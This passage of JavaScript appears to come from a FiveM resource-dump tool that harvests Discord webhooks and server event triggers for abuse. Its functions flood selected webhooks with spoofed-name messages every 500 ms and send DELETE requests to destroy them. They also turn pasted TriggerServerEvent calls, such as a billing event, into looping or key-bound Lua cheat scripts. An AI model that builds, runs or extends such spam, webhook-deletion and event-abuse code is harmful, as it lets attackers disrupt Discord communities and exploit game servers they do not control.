    } catch (error) {
        console.error('Error sending webhook:', error);
        showNotification('Error sending webhook', 'error');
    }
}

function clearWebhookForm() {
    try {
        document.getElementById('override-username').value = '';
        document.getElementById('avatar-url').value = 'https://example.com/avatar.png';
        document.getElementById('message-content').value = '';
        document.getElementById('tts-checkbox').checked = false;
        document.getElementById('embed-checkbox').checked = false;
        document.getElementById('embed-title').value = '';
        document.getElementById('embed-description').value = '';
        document.getElementById('embed-color').value = '#ededed';
        document.getElementById('embed-author-name').value = '';
        document.getElementById('embed-author-icon').value = '';
        document.getElementById('embed-footer-text').value = '';
        document.getElementById('embed-footer-icon').value = '';
        document.getElementById('embed-thumbnail-url').value = '';
        document.getElementById('embed-image-url').value = '';
        
        const colorSwatch = document.getElementById('color-swatch');
        if (colorSwatch) {
            colorSwatch.style.backgroundColor = '#ededed';
        }
        
        const embedOptions = document.getElementById('embed-options');
        if (embedOptions) {
            embedOptions.style.display = 'none';
        }
        
        updatePreview();
        showNotification('Form cleared', 'success');
    } catch (error) {
        console.error('Error clearing form:', error);
    }
}

async function startWebhookSpam() {
    try {
        if (appState.selectedWebhooks.length === 0) {
            showNotification('Please select at least one webhook in the Webhooks tab or add manual webhooks', 'error');
            return;
        }
        
        const message = document.getElementById('message-content')?.value || '';
        const username = document.getElementById('override-username')?.value || '';
        const avatarUrl = document.getElementById('avatar-url')?.value || '';
        const tts = document.getElementById('tts-checkbox')?.checked || false;
        const embed = document.getElementById('embed-checkbox')?.checked || false;
        
        if (!message.trim()) {
            showNotification('Please enter a message', 'error');
            return;
        }
        
        appState.isSpamming = true;
        const startBtn = document.querySelector('.start-spam-btn');
        const stopBtn = document.querySelector('.stop-spam-btn');
        
        startBtn.disabled = true;
        stopBtn.disabled = false;
        
        let spamCount = 0;

        const payload = {
            content: message,
            tts: tts
        };

        if (username && username.trim()) {
            payload.username = username.trim();
        }

        if (avatarUrl && avatarUrl.trim()) {
            payload.avatar_url = avatarUrl.trim();
        }
        
        if (embed) {
            const embedTitle = document.getElementById('embed-title')?.value || '';
            const embedDescription = document.getElementById('embed-description')?.value || '';
            const embedColorHex = document.getElementById('embed-color')?.value || '#ededed';
            const embedAuthorName = document.getElementById('embed-author-name')?.value || '';
            const embedAuthorIcon = document.getElementById('embed-author-icon')?.value || '';
            const embedFooterText = document.getElementById('embed-footer-text')?.value || '';
            const embedFooterIcon = document.getElementById('embed-footer-icon')?.value || '';
            const embedThumbnailUrl = (document.getElementById('embed-thumbnail-url')?.value || '').trim();
            const embedImageUrl = (document.getElementById('embed-image-url')?.value || '').trim();
            
            const colorValue = embedColorHex.startsWith('#') ? embedColorHex : '#' + embedColorHex;
            const embedColor = parseInt(colorValue.replace('#', ''), 16);
            
            const embedObj = {
                color: embedColor,
                timestamp: new Date().toISOString()
            };
            
            if (embedTitle) embedObj.title = embedTitle;
            if (embedDescription) embedObj.description = embedDescription;
            if (embedAuthorName || embedAuthorIcon) {
                embedObj.author = {};
                if (embedAuthorName) embedObj.author.name = embedAuthorName;
                if (embedAuthorIcon) embedObj.author.icon_url = embedAuthorIcon;
            }
            if (embedFooterText || embedFooterIcon) {
                embedObj.footer = {};
                if (embedFooterText) embedObj.footer.text = embedFooterText;
                if (embedFooterIcon) embedObj.footer.icon_url = embedFooterIcon;
            }
            if (embedThumbnailUrl) {
                embedObj.thumbnail = { url: embedThumbnailUrl };
            }
            if (embedImageUrl) {
                embedObj.image = { url: embedImageUrl };
            }
            
            payload.embeds = [embedObj];
        }

        (async () => {
            spamCount++;
            let successCount = 0;
            let errorCount = 0;

            const webhookPromises = appState.selectedWebhooks.map(async (webhookUrl) => {
                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (response.ok) {
                        return { success: true };
                    } else {
                        return { success: false };
                    }
                } catch (error) {
                    return { success: false };
                }
            });
            
            const results = await Promise.all(webhookPromises);
            successCount = results.filter(r => r.success).length;
            errorCount = results.filter(r => !r.success).length;
            
            showNotification(`Spam ${spamCount}: Sent to ${successCount} webhook(s)${errorCount > 0 ? `, ${errorCount} failed` : ''}`, 'info');
        })();

        appState.spamInterval = setInterval(async () => {
            if (!appState.isSpamming) return;
            
            spamCount++;
            let successCount = 0;
            let errorCount = 0;

            const webhookPromises = appState.selectedWebhooks.map(async (webhookUrl) => {
                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (response.ok) {
                        return { success: true };
                    } else {
                        return { success: false };
                    }
                } catch (error) {
                    return { success: false };
                }
            });
            
            const results = await Promise.all(webhookPromises);
            successCount = results.filter(r => r.success).length;
            errorCount = results.filter(r => !r.success).length;
            
            showNotification(`Spam ${spamCount}: Sent to ${successCount} webhook(s)${errorCount > 0 ? `, ${errorCount} failed` : ''}`, 'info');
        }, 500); // Send every 500ms (faster)
        
        showNotification(`Started webhook spam to ${appState.selectedWebhooks.length} webhook(s)`, 'success');
    } catch (error) {
        console.error('Error starting webhook spam:', error);
        showNotification('Error starting webhook spam', 'error');
    }
}

function stopWebhookSpam() {
    try {
        if (appState.spamInterval) {
            clearInterval(appState.spamInterval);
            appState.spamInterval = null;
        }
        
        appState.isSpamming = false;
        
        const startBtn = document.querySelector('.start-spam-btn');
        const stopBtn = document.querySelector('.stop-spam-btn');
        
        startBtn.disabled = false;
        stopBtn.disabled = true;
        
        showNotification('Stopped webhook spam', 'success');
    } catch (error) {
        console.error('Error stopping webhook spam:', error);
    }
}

function updatePreview() {
    try {
        const messageText = document.getElementById('message-content')?.value || 'Your message here...';
        const username = document.getElementById('override-username')?.value || 'WEBHOOKED';
        const embedCheckbox = document.getElementById('embed-checkbox');
        
        const messageTextElement = document.querySelector('.message-text');
        const messageUsernameElement = document.querySelector('.message-username');
        const messageEmbedElement = document.querySelector('.message-embed');
        
        if (messageTextElement) {
            messageTextElement.textContent = messageText;
        }
        
        if (messageUsernameElement) {
            messageUsernameElement.textContent = username;
        }
        
        if (messageEmbedElement && embedCheckbox) {
            const showEmbed = embedCheckbox.checked;
            messageEmbedElement.style.display = showEmbed ? 'block' : 'none';
            
            if (showEmbed) {
                const embedTitle = document.getElementById('embed-title')?.value || '';
                const embedDescription = document.getElementById('embed-description')?.value || '';
                const embedColor = document.getElementById('embed-color')?.value || '#ededed';
                const authorName = document.getElementById('embed-author-name')?.value || '';
                const authorIcon = document.getElementById('embed-author-icon')?.value || '';
                const footerText = document.getElementById('embed-footer-text')?.value || '';
                const footerIcon = document.getElementById('embed-footer-icon')?.value || '';
                const thumbnailUrl = document.getElementById('embed-thumbnail-url')?.value || '';
                const imageUrl = document.getElementById('embed-image-url')?.value || '';
                
                const previewTitle = document.getElementById('preview-embed-title');
                const previewDescription = document.getElementById('preview-embed-description');
                const previewAuthor = document.getElementById('preview-embed-author');
                const previewAuthorName = document.getElementById('preview-embed-author-name');
                const previewAuthorIcon = document.getElementById('preview-embed-author-icon');
                const previewFooter = document.getElementById('preview-embed-footer');
                const previewFooterText = document.getElementById('preview-embed-footer-text');
                const previewFooterIcon = document.getElementById('preview-embed-footer-icon');
                const previewThumbnail = document.getElementById('preview-embed-thumbnail');
                const previewThumbnailImg = document.getElementById('preview-embed-thumbnail-img');
                const previewImage = document.getElementById('preview-embed-image');
                const previewImageImg = document.getElementById('preview-embed-image-img');
                
                if (previewTitle) {
                    previewTitle.textContent = embedTitle;
                    previewTitle.style.display = embedTitle ? 'block' : 'none';
                }
                
                if (previewDescription) {
                    previewDescription.textContent = embedDescription;
                    previewDescription.style.display = embedDescription ? 'block' : 'none';
                }
                
                if (messageEmbedElement) {
                    const colorValue = embedColor.startsWith('#') ? embedColor : '#' + embedColor;
                    messageEmbedElement.style.borderLeftColor = colorValue;
                }
                
                if (previewAuthor && previewAuthorName) {
                    previewAuthorName.textContent = authorName;
                    previewAuthor.style.display = authorName ? 'flex' : 'none';
                    
                    if (previewAuthorIcon && authorIcon) {
                        previewAuthorIcon.src = authorIcon;
                        previewAuthorIcon.style.display = 'block';
                        previewAuthorIcon.onerror = () => {
                            previewAuthorIcon.style.display = 'none';
                        };
                    } else if (previewAuthorIcon) {
                        previewAuthorIcon.style.display = 'none';
                    }
                }
                
                if (previewFooter && previewFooterText) {
                    previewFooterText.textContent = footerText;
                    previewFooter.style.display = footerText ? 'flex' : 'none';
                    
                    if (previewFooterIcon && footerIcon) {
                        previewFooterIcon.src = footerIcon;
                        previewFooterIcon.style.display = 'block';
                        previewFooterIcon.onerror = () => {
                            previewFooterIcon.style.display = 'none';
                        };
                    } else if (previewFooterIcon) {
                        previewFooterIcon.style.display = 'none';
                    }
                }
                
                if (previewThumbnail && previewThumbnailImg) {
                    if (thumbnailUrl) {
                        previewThumbnailImg.src = thumbnailUrl;
                        previewThumbnail.style.display = 'block';
                        previewThumbnailImg.onerror = () => {
                            previewThumbnail.style.display = 'none';
                        };
                    } else {
                        previewThumbnail.style.display = 'none';
                    }
                }
                
                if (previewImage && previewImageImg) {
                    if (imageUrl) {
                        previewImageImg.src = imageUrl;
                        previewImage.style.display = 'block';
                        previewImageImg.onerror = () => {
                            previewImage.style.display = 'none';
                        };
                    } else {
                        previewImage.style.display = 'none';
                    }
                }
            }
        }
    } catch (error) {
        console.error('Error updating preview:', error);
    }
}

function loadSampleData() {

    updateSavedTriggersList();
    updateStats();
}

let lastNotification = { message: '', time: 0 };
const NOTIFICATION_DEBOUNCE_MS = 500;

function showNotification(message, type = 'info') {
    try {
        const now = Date.now();
        if (lastNotification.message === message && (now - lastNotification.time) < NOTIFICATION_DEBOUNCE_MS) {
            return;
        }
        lastNotification = { message, time: now };

        let notificationContainer = document.getElementById('notification-container');
        if (!notificationContainer) {
            notificationContainer = document.createElement('div');
            notificationContainer.id = 'notification-container';
            notificationContainer.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 100000;
                display: flex;
                flex-direction: column;
                gap: 10px;
                pointer-events: none;
            `;
            document.body.appendChild(notificationContainer);
        }
        
        const notification = document.createElement('div');
        notification.style.cssText = `
            padding: 15px 20px;
            border-radius: 6px;
            color: white;
            font-size: 14px;
            max-width: 300px;
            word-wrap: break-word;
            animation: slideIn 0.3s ease;
            pointer-events: auto;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        `;
        
        switch (type) {
            case 'success':
                notification.style.background = '#34d399';
                break;
            case 'error':
                notification.style.background = '#e05572';
                break;
            case 'warning':
                notification.style.background = '#e3b341';
                break;
            default:
                notification.style.background = '#ededed';
        }
        
        notification.textContent = message;
        notificationContainer.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }, 3000);
    } catch (error) {
        console.error('Error showing notification:', error);
    }
}

function showDeepScanNotification() {
    try {

        removeDeepScanNotification();

        let notificationContainer = document.getElementById('notification-container');
        if (!notificationContainer) {
            notificationContainer = document.createElement('div');
            notificationContainer.id = 'notification-container';
            notificationContainer.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 100000;
                display: flex;
                flex-direction: column;
                gap: 10px;
                pointer-events: none;
            `;
            document.body.appendChild(notificationContainer);
        }

        const notification = document.createElement('div');
        notification.id = 'deep-scan-notification';
        notification.style.cssText = `
            padding: 15px 20px;
            border-radius: 6px;
            color: white;
            font-size: 14px;
            max-width: 300px;
            word-wrap: break-word;
            animation: slideIn 0.3s ease;
            pointer-events: auto;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            background: #ededed;
        `;
        notification.textContent = 'Deep scan in progress...';
        notificationContainer.appendChild(notification);
    } catch (error) {
        console.error('Error showing deep scan notification:', error);
    }
}

function updateDeepScanNotification(processedFiles, totalFiles) {
    try {
        const notification = document.getElementById('deep-scan-notification');
        if (notification) {
            const percentage = totalFiles > 0 ? Math.round((processedFiles / totalFiles) * 100) : 0;
            notification.textContent = `Deep scan in progress... ${processedFiles}/${totalFiles} files (${percentage}%)`;
        }
    } catch (error) {
        console.error('Error updating deep scan notification:', error);
    }
}

function removeDeepScanNotification() {
    try {
        const notification = document.getElementById('deep-scan-notification');
        if (notification && notification.parentNode) {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }
    } catch (error) {
        console.error('Error removing deep scan notification:', error);
    }
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;
document.head.appendChild(style); 

function addManualWebhook() {
    try {
        const input = document.getElementById('manual-webhook-url');
        const url = input.value.trim();
        
        if (!url) {
            showNotification('Please enter a webhook URL', 'error');
            return;
        }

        if (!url.includes('discord.com/api/webhooks/') && !url.includes('discordapp.com/api/webhooks/')) {
            showNotification('Please enter a valid Discord webhook URL', 'error');
            return;
        }

        if (appState.manualWebhooks.includes(url) || appState.selectedWebhooks.includes(url)) {
            showNotification('This webhook is already added', 'warning');
            return;
        }
        
        appState.manualWebhooks.push(url);
        updateSpammerSelectedWebhooks();
        input.value = '';
        
        showNotification('Webhook added successfully', 'success');
    } catch (error) {
        console.error('Error adding manual webhook:', error);
        showNotification('Error adding webhook', 'error');
    }
}

function updateManualWebhooksList() {
    try {
        const container = document.getElementById('manual-webhooks-list');
        if (!container) return;

        container.innerHTML = '';

        const manualWebhooks = appState.selectedWebhooks.filter(url => 
            !appState.scanResults.webhooks.some(webhook => webhook.url === url)
        );
        
        if (manualWebhooks.length === 0) {
            container.innerHTML = '<p style="color: #9a9aa8; text-align: center; font-size: 12px;">No manual webhooks added</p>';
            return;
        }
        
        manualWebhooks.forEach(url => {
            const webhookItem = document.createElement('div');
            webhookItem.className = 'manual-webhook-item';
            webhookItem.innerHTML = `
                <span class="webhook-url">${url}</span>
                <button class="remove-btn" onclick="removeSelectedWebhook('${url}')">
                    <i class="fas fa-times"></i>
                </button>
            `;
            
            container.appendChild(webhookItem);
        });
    } catch (error) {
        console.error('Error updating manual webhooks list:', error);
    }
}

function updateSelectedWebhooksList() {
    try {
        const container = document.getElementById('selected-webhooks-list');
        if (!container) return;

        container.innerHTML = '';
        
        if (appState.selectedWebhooks.length === 0) {
            container.innerHTML = '<p style="color: #9a9aa8; text-align: center; font-size: 12px;">No webhooks selected</p>';
            return;
        }
        
        appState.selectedWebhooks.forEach((url, index) => {
            const webhookItem = document.createElement('div');
            webhookItem.className = 'selected-webhook-item';

            const isManual = appState.manualWebhooks.includes(url);
            const sourceText = isManual ? ' (Manual)' : ' (Scanned)';
            
            webhookItem.innerHTML = `
                <span class="webhook-url">${url}${sourceText}</span>
                <div class="webhook-actions">
                    <button class="delete-webhook-btn" onclick="deleteWebhook('${url}')" title="Delete Webhook">
                        <i class="fas fa-trash"></i>
                    </button>
                    <button class="remove-btn" onclick="removeSelectedWebhook('${url}')" title="Remove from Selection">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            `;
            
            container.appendChild(webhookItem);
        });
    } catch (error) {
        console.error('Error updating selected webhooks list:', error);
    }
}

async function deleteWebhook(url) {
    try {
        if (!confirm('Are you sure you want to DELETE this webhook? This action cannot be undone!')) {
            return;
        }
        
        showNotification('Deleting webhook...', 'info');
        
        const response = await fetch(url, {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response.ok) {
            showNotification('Webhook DELETED successfully!', 'success');

            appState.selectedWebhooks = appState.selectedWebhooks.filter(webhookUrl => webhookUrl !== url);
            appState.manualWebhooks = appState.manualWebhooks.filter(webhookUrl => webhookUrl !== url);

            if (appState.scanResults && appState.scanResults.webhooks) {
                appState.scanResults.webhooks = appState.scanResults.webhooks.filter(w => w.url !== url);
            }
            
            updateSelectedWebhooksList();
            updateManualWebhooksList();
            updateWebhooksTable();
            updateSpammerSelectedWebhooks();
            
        } else {
            const errorText = await response.text();
            showNotification(`Failed to delete webhook: ${response.status} - ${errorText}`, 'error');
        }
        
    } catch (error) {
        console.error('Error deleting webhook:', error);
        showNotification('Error deleting webhook: ' + error.message, 'error');
    }
}

function removeDuplicateTriggers(triggers) {
    try {
        const seen = new Set();
        return triggers.filter(trigger => {
            const key = `${trigger.resource}-${trigger.usage}-${trigger.file}-${trigger.line}`;
            if (seen.has(key)) {
                return false;
            }
            seen.add(key);
            return true;
        });
    } catch (error) {
        console.error('Error removing duplicate triggers:', error);
        return triggers;
    }
}

function removeDuplicateWebhooks(webhooks) {
    try {
        const seen = new Set();
        return webhooks.filter(webhook => {
            const key = `${webhook.resource}-${webhook.url}-${webhook.file}-${webhook.line}`;
            if (seen.has(key)) {
                return false;
            }
            seen.add(key);
            return true;
        });
    } catch (error) {
        console.error('Error removing duplicate webhooks:', error);
        return webhooks;
    }
}

function removeDuplicateItems(items) {
    try {
        const seen = new Set();
        return items.filter(item => {
            const key = `${item.resource}-${item.name}-${item.file}-${item.line}`;
            if (seen.has(key)) {
                return false;
            }
            seen.add(key);
            return true;
        });
    } catch (error) {
        console.error('Error removing duplicate items:', error);
        return items;
    }
}

function removeDuplicateCoordinates(coordinates) {
    try {
        const seen = new Set();
        return coordinates.filter(coord => {
            const key = `${coord.resource}-${coord.x}-${coord.y}-${coord.z}-${coord.file}-${coord.line}`;
            if (seen.has(key)) {
                return false;
            }
            seen.add(key);
            return true;
        });
    } catch (error) {
        console.error('Error removing duplicate coordinates:', error);
        return coordinates;
    }
}

function attachImagesToItems(items, itemImages) {
    try {
        return items.map(item => {
            const imageUrl = itemImages.get(item.name.toLowerCase());
            if (imageUrl) {
                item.imageUrl = imageUrl;
            }
            return item;
        });
    } catch (error) {
        console.error('Error attaching images to items:', error);
        return items;
    }
}

function handleResourceSearch(event) {
    try {
        const searchTerm = event.target.value.toLowerCase().trim();
        const resourceTree = document.getElementById('resource-tree');
        
        if (!resourceTree || !appState.selectedFiles || appState.selectedFiles.length === 0) {
            return;
        }
        
        if (searchTerm === '') {

            updateResourceExplorer(appState.selectedFiles);
            return;
        }

        const filteredFiles = appState.selectedFiles.filter(file => {
            const fileName = file.name.toLowerCase();
            const filePath = file.webkitRelativePath.toLowerCase();
            return fileName.includes(searchTerm) || filePath.includes(searchTerm);
        });

        updateResourceExplorer(filteredFiles, searchTerm);
        
    } catch (error) {
        console.error('Error handling resource search:', error);
    }
}

function handleLoopTrigger() {
    try {
        const resourceName = document.getElementById('editor-resource-name').value.trim() || 'resource';
        const loopDelay = document.getElementById('editor-loop-delay').value.trim() || '1000';
        const triggerText = document.getElementById('editor-trigger-text').value.trim();
        
        console.log('Loop Trigger Debug:', { resourceName, loopDelay, triggerText });
        
        if (!triggerText) {
            showNotification('Please paste a trigger in the editor area', 'error');
            return;
        }

        const transformedTrigger = transformTriggerToLoop(triggerText, resourceName, loopDelay);
        
        console.log('Transformed Loop Trigger:', transformedTrigger);

        document.getElementById('editor-trigger-text').value = transformedTrigger;
        
        showNotification(`Trigger transformed into loop for ${resourceName} with ${loopDelay}ms delay`, 'success');
        
    } catch (error) {
        console.error('Error transforming trigger to loop:', error);
        showNotification('Error transforming trigger to loop: ' + error.message, 'error');
    }
}

function handleKeybindTrigger() {
    try {
        const resourceName = document.getElementById('editor-resource-name').value.trim() || 'resource';
        const keybind = document.getElementById('editor-keybind').value.trim();
        const triggerText = document.getElementById('editor-trigger-text').value.trim();
        
        console.log('Keybind Trigger Debug:', { resourceName, keybind, triggerText });
        
        if (!keybind) {
            showNotification('Please enter a keybind', 'error');
            return;
        }
        
        if (!triggerText) {
            showNotification('Please paste a trigger in the editor area', 'error');
            return;
        }

        const transformedTrigger = transformTriggerToKeybind(triggerText, resourceName, keybind);
        
        console.log('Transformed Keybind Trigger:', transformedTrigger);

        document.getElementById('editor-trigger-text').value = transformedTrigger;
        
        showNotification(`Trigger transformed into keybind for ${resourceName} with key ${keybind.toUpperCase()}`, 'success');
        
    } catch (error) {
        console.error('Error transforming trigger to keybind:', error);
        showNotification('Error transforming trigger to keybind: ' + error.message, 'error');
    }
}

function transformTriggerToLoop(triggerText, resourceName, delay) {
    try {
        console.log('Starting loop transformation with:', { triggerText, resourceName, delay });

        let transformedTrigger = triggerText;

        transformedTrigger = transformedTrigger.replace(/Citizen\.CreateThread\s*\(\s*function\s*\(\s*\)\s*\{[\s\S]*?\}\s*\)\s*;?\s*$/g, '');
        transformedTrigger = transformedTrigger.replace(/while\s+true\s+do[\s\S]*?end/g, '');
        transformedTrigger = transformedTrigger.replace(/Citizen\.Wait\s*\(\s*\d+\s*\)\s*;?\s*$/g, '');

        transformedTrigger = transformedTrigger.trim();
        
        console.log('Cleaned trigger text:', transformedTrigger);

        const lines = transformedTrigger.split('\n');
        const cleanedLines = lines.map(line => line.trim()).filter(line => line.length > 0);
        
        console.log('Cleaned lines:', cleanedLines);

        if (cleanedLines.length === 0) {
            cleanedLines.push(triggerText.trim());
        }

        const loopCode = `-- Loop Trigger for ${resourceName}
-- Delay: ${delay}ms

Citizen.CreateThread(function()
    while true do
        ${cleanedLines.join('\n        ')}
        Citizen.Wait(${delay})
    end
end)`;
        
        console.log('Generated loop code:', loopCode);
        return loopCode;
        
    } catch (error) {
        console.error('Error transforming trigger to loop:', error);
        return `-- Error transforming trigger to loop
-- Error: ${error.message}
-- Original trigger:
${triggerText}

-- Please check your trigger syntax`;
    }
}

function transformTriggerToKeybind(triggerText, resourceName, keybind) {
    try {
        console.log('Starting keybind transformation with:', { triggerText, resourceName, keybind });

        let transformedTrigger = triggerText;

        transformedTrigger = transformedTrigger.replace(/Citizen\.CreateThread\s*\(\s*function\s*\(\s*\)\s*\{[\s\S]*?\}\s*\)\s*;?\s*$/g, '');
        transformedTrigger = transformedTrigger.replace(/while\s+true\s+do[\s\S]*?end/g, '');
        transformedTrigger = transformedTrigger.replace(/if\s+IsControlJustPressed\s*\(\s*0\s*,\s*\d+\s*\)\s+then[\s\S]*?end/g, '');
        transformedTrigger = transformedTrigger.replace(/Citizen\.Wait\s*\(\s*0\s*\)\s*;?\s*$/g, '');

        transformedTrigger = transformedTrigger.trim();
        
        console.log('Cleaned trigger text:', transformedTrigger);

        const lines = transformedTrigger.split('\n');
        const cleanedLines = lines.map(line => line.trim()).filter(line => line.length > 0);
        
        console.log('Cleaned lines:', cleanedLines);

        if (cleanedLines.length === 0) {
            cleanedLines.push(triggerText.trim());
        }

        const keyCode = getKeyCode(keybind);
        
        console.log('Key code for', keybind, ':', keyCode);

        const keybindCode = `-- Keybind Trigger for ${resourceName}
-- Key: ${keybind.toUpperCase()} (Code: ${keyCode})

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if IsControlJustPressed(0, ${keyCode}) then
            ${cleanedLines.join('\n            ')}
        end
    end
end)`;
        
        console.log('Generated keybind code:', keybindCode);
        return keybindCode;
        
    } catch (error) {
        console.error('Error transforming trigger to keybind:', error);
        return `-- Error transforming trigger to keybind
-- Error: ${error.message}
-- Original trigger:
${triggerText}

-- Please check your trigger syntax`;
    }
}

function getKeyCode(key) {

    const keyCodes = {
        'E': '38',
        'F': '23',
        'G': '47',
        'H': '74',
        'I': '73',
        'J': '74',
        'K': '311',
        'L': '182',
        'M': '244',
        'N': '249',
        'O': '199',
        'P': '199',
        'Q': '44',
        'R': '45',
        'S': '33',
        'T': '245',
        'U': '303',
        'V': '47',
        'W': '32',
        'X': '73',
        'Y': '246',
        'Z': '20',
        '1': '157',
        '2': '158',
        '3': '160',
        '4': '164',
        '5': '165',
        '6': '159',
        '7': '161',
        '8': '162',
        '9': '163',
        '0': '164',
        'ENTER': '191',
        'SPACE': '22',
        'SHIFT': '21',
        'CTRL': '36',
        'ALT': '19',
        'TAB': '37',
        'ESC': '322',
        'BACKSPACE': '194',
        'DELETE': '178',
        'INSERT': '121',
        'HOME': '212',
        'END': '213',
        'PAGEUP': '10',
        'PAGEDOWN': '11',
        'ARROWUP': '172',
        'ARROWDOWN': '173',
        'ARROWLEFT': '174',
        'ARROWRIGHT': '175'
    };
    
    const upperKey = key.toUpperCase();
    return keyCodes[upperKey] || '38'; // Default to E if key not found
}

function testEditor() {
    console.log('Testing Editor functionality...');

    const testTrigger = "TriggerServerEvent('esx_billing:sendBill', playerId, 1000)";
    const testResource = "esx_billing";
    const testDelay = "1000";
    
    console.log('Test Loop Trigger:');
    const loopResult = transformTriggerToLoop(testTrigger, testResource, testDelay);
    console.log(loopResult);

    const testKeybind = "E";
    console.log('Test Keybind Trigger:');
    const keybindResult = transformTriggerToKeybind(testTrigger, testResource, testKeybind);
    console.log(keybindResult);
    
    return { loopResult, keybindResult };
}

function debugEditorInputs() {
    const resourceName = document.getElementById('editor-resource-name')?.value;
    const keybind = document.getElementById('editor-keybind')?.value;
    const loopDelay = document.getElementById('editor-loop-delay')?.value;
    const triggerText = document.getElementById('editor-trigger-text')?.value;
    
    console.log('Current Editor Inputs:', {
        resourceName,
        keybind,
        loopDelay,
        triggerText,
        resourceNameElement: !!document.getElementById('editor-resource-name'),
        keybindElement: !!document.getElementById('editor-keybind'),
        loopDelayElement: !!document.getElementById('editor-loop-delay'),
        triggerTextElement: !!document.getElementById('editor-trigger-text')
    });
    
    return { resourceName, keybind, loopDelay, triggerText };
}

function testEditorFunction() {
    try {
        console.log('Testing Editor functionality...');

        const resourceNameField = document.getElementById('editor-resource-name');
        const keybindField = document.getElementById('editor-keybind');
        const loopDelayField = document.getElementById('editor-loop-delay');
        const triggerTextField = document.getElementById('editor-trigger-text');

        if (resourceNameField) resourceNameField.value = '';
        if (keybindField) keybindField.value = 'E';
        if (loopDelayField) loopDelayField.value = '';
        if (triggerTextField) triggerTextField.value = "TriggerServerEvent('esx_billing:sendBill', playerId, 1000)";
        
        console.log('Fields populated with test data (empty resource name and loop delay to show defaults)');

        const testTrigger = "TriggerServerEvent('esx_billing:sendBill', playerId, 1000)";
        const testResource = "resource"; // Default
        const testDelay = "1000"; // Default
        const testKeybind = "E";
        
        console.log('Testing loop transformation with defaults...');
        const loopResult = transformTriggerToLoop(testTrigger, testResource, testDelay);
        console.log('Loop result:', loopResult);
        
        console.log('Testing keybind transformation with defaults...');
        const keybindResult = transformTriggerToKeybind(testTrigger, testResource, testKeybind);
        console.log('Keybind result:', keybindResult);

        showNotification('Editor test completed! Check console for results. (Defaults: resource name="resource", loop delay=1000ms)', 'success');
        
        return { loopResult, keybindResult };
        
    } catch (error) {
        console.error('Error in test function:', error);
        showNotification('Test failed: ' + error.message, 'error');
    }
}

function setupSpammerEventListeners() {
    try {
        console.log('Setting up Spammer event listeners...');

        const sendBtn = document.querySelector('.send-btn');
        const clearBtn = document.querySelector('.clear-btn');
        const startSpamBtn = document.querySelector('.start-spam-btn');
        const stopSpamBtn = document.querySelector('.stop-spam-btn');
        const addWebhookBtn = document.getElementById('add-webhook-btn');
        const manualWebhookInput = document.getElementById('manual-webhook-url');

        if (sendBtn) {
            sendBtn.replaceWith(sendBtn.cloneNode(true));
            const newSendBtn = document.querySelector('.send-btn');
            newSendBtn.addEventListener('click', sendWebhookOnce);
            console.log('Send button event listener added');
        }

        if (clearBtn) {
            clearBtn.replaceWith(clearBtn.cloneNode(true));
            const newClearBtn = document.querySelector('.clear-btn');
            newClearBtn.addEventListener('click', clearWebhookForm);
            console.log('Clear button event listener added');
        }

        if (startSpamBtn) {
            startSpamBtn.replaceWith(startSpamBtn.cloneNode(true));
            const newStartSpamBtn = document.querySelector('.start-spam-btn');
            newStartSpamBtn.addEventListener('click', startWebhookSpam);
            console.log('Start spam button event listener added');
        }

        if (stopSpamBtn) {
            stopSpamBtn.replaceWith(stopSpamBtn.cloneNode(true));
            const newStopSpamBtn = document.querySelector('.stop-spam-btn');
            newStopSpamBtn.addEventListener('click', stopWebhookSpam);
            console.log('Stop spam button event listener added');
        }

        if (addWebhookBtn) {
            addWebhookBtn.replaceWith(addWebhookBtn.cloneNode(true));
            const newAddWebhookBtn = document.getElementById('add-webhook-btn');
            newAddWebhookBtn.addEventListener('click', addManualWebhook);
            console.log('Add webhook button event listener added');
        }

        if (manualWebhookInput) {
            manualWebhookInput.replaceWith(manualWebhookInput.cloneNode(true));
            const newManualWebhookInput = document.getElementById('manual-webhook-url');
            newManualWebhookInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    addManualWebhook();
                }
            });
            console.log('Manual webhook input event listener added');
        }

        const deleteWebhookBtn = document.getElementById('delete-webhook-btn');
        if (deleteWebhookBtn) {
            deleteWebhookBtn.replaceWith(deleteWebhookBtn.cloneNode(true));
            const newDeleteWebhookBtn = document.getElementById('delete-webhook-btn');
            newDeleteWebhookBtn.addEventListener('click', () => {
                const selectedWebhooks = appState.selectedWebhooks;
                if (selectedWebhooks.length === 0) {
                    showNotification('No webhooks selected to delete', 'error');
                    return;
                }
                
                if (confirm(`Are you sure you want to delete ${selectedWebhooks.length} webhook(s)? This action cannot be undone!`)) {
                    selectedWebhooks.forEach(webhookUrl => {
                        deleteWebhook(webhookUrl);
                    });
                }
            });
            console.log('Delete webhook button event listener added');
        }

        const messageContent = document.getElementById('message-content');
        const overrideUsername = document.getElementById('override-username');
        const embedCheckbox = document.getElementById('embed-checkbox');
        
        if (messageContent) {
